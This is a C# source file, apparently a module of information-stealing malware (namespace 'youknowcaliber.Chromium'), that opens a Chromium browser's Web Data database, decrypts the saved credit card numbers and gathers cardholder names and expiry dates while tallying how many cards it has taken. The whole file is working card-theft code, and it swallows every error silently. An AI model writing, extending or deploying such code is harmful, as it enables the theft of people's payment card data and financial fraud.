using System.Collections.Generic;

namespace youknowcaliber.Chromium
{ 
    internal sealed class CreditCards
    {
    
        public static List<CreditCard> Get(string sWebData)
        {
            List<CreditCard> lcCC = new List<CreditCard>();
            try
            {
                // Read data from table
                SQLite sSQLite = SqlReader.ReadTable(sWebData, "credit_cards");
                if (sSQLite == null) return lcCC;

                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                {

                    CreditCard cCard = new CreditCard();

                    cCard.sNumber = Crypto.GetUTF8(Crypto.EasyDecrypt(sWebData, sSQLite.GetValue(i, 4)));
                    cCard.sExpYear = Crypto.GetUTF8(sSQLite.GetValue(i, 3));
                    cCard.sExpMonth = Crypto.GetUTF8(sSQLite.GetValue(i, 2));
                    cCard.sName = Crypto.GetUTF8(sSQLite.GetValue(i, 1));

                    Counting.CreditCards++;
                    lcCC.Add(cCard);
                }
            }
            catch  {  }
            return lcCC;
        }
    }
}
